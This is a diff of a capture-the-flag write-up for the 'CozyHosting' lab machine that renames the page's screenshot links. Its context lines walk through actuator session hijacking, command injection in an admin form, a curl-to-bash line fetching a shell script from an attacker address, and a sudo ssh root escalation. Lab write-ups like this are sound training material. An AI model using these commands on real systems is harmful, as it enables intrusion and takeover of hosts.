@@ -36,7 +36,7 @@ We can add this host to our `/etc/hosts` file and start proxying traffic through
 
 Port 80 shows a basic corporate site:
 
-![](<../../.gitbook/assets/image%20(25).png>)
+![](../../.gitbook/assets/cozyhosting-1.png)
 
 There is a login function, but weak credentials or basic SQL Injection attacks don't seem to work. I did a `gobuster` directory scan, which revealed a few directories:
 
@@ -65,13 +65,13 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 When visiting all of these, the `/error` endpoint stood out:
 
-![](<../../.gitbook/assets/image%20(26).png>)
+![](../../.gitbook/assets/cozyhosting-2.png)
 
 Whitelabel Error Page means that the website uses Spring Boot, which requires a different method of enumeration. Using something called Actuators, we can query information about the website through HTTP requests:
 
 {% embed url="https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators" %}
 
-![](<../../.gitbook/assets/image%20(27).png>)
+![](../../.gitbook/assets/cozyhosting-3.png)
 
 Using this, we can try to find some custom endpoints that may not be present in any wordlist. We can use the `/actuator/mappings` directory for this:
 
@@ -117,13 +117,13 @@ $ curl --silent http://cozyhosting.htb/actuator/sessions | jq
 
 Using this cookie, we can access the administrator dashboard:
 
-![](<../../.gitbook/assets/image%20(28).png>)
+![](../../.gitbook/assets/cozyhosting-4.png)
 
 ### Admin Dashboard -> RCE
 
 At the bottom of the dashboard, we can see a few fields that take user input and hint that this is the `/executessh` service:
 
-![](<../../.gitbook/assets/image%20(29).png>)
+![](../../.gitbook/assets/cozyhosting-5.png)
 
 When submitting some random values, the browser sends a POST request to `/executessh`, and the error is sent through a GET request:
 
@@ -166,11 +166,11 @@ Upgrade-Insecure-Requests: 1
 host=127.0.0.1&username=`id`
 ```
 
-![](<../../.gitbook/assets/image%20(30).png>)
+![](../../.gitbook/assets/cozyhosting-6.png)
 
 Using this, we can try to get a reverse shell as the user. When testing random payloads, I managed to trigger an error on the machine as well by typing `{$IFS}` wrongly:
 
-![](<../../.gitbook/assets/image%20(31).png>)
+![](../../.gitbook/assets/cozyhosting-7.png)
 
 The `bash` reverse shell one-liner didn't work and was quite problematic with all of its special characters, so I used a `curl` one-liner instead.
 
@@ -178,7 +178,7 @@ The `bash` reverse shell one-liner didn't work and was quite problematic with al
 curl${IFS}10.10.14.22/shell.sh|bash
 ```
 
-![](<../../.gitbook/assets/image%20(32).png>)
+![](../../.gitbook/assets/cozyhosting-8.png)
 
 ## Privilege Escalation
 
@@ -261,7 +261,7 @@ grep: (standard input): binary file matches
 
 The above password works and we can login to the database:
 
-![](<../../.gitbook/assets/image%20(33).png>)
+![](../../.gitbook/assets/cozyhosting-9.png)
 
 Afterwards, we can enumerate this database. There are a few databases available:
 
@@ -323,7 +323,7 @@ josh
 
 Using this password, we can `ssh` in as `josh`:
 
-![](<../../.gitbook/assets/image%20(34).png>)
+![](../../.gitbook/assets/cozyhosting-10.png)
 
 ### Sudo Privileges -> Root
 
@@ -347,6 +347,6 @@ Using the command on GTFOBins, we can spawn a `root` shell:
 sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
 ```
 
-![](<../../.gitbook/assets/image%20(35).png>)
+![](../../.gitbook/assets/cozyhosting-11.png)
 
 Rooted!
